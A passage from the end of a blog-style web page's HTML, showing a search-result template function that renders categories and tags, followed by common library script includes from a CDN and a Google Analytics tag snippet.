founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
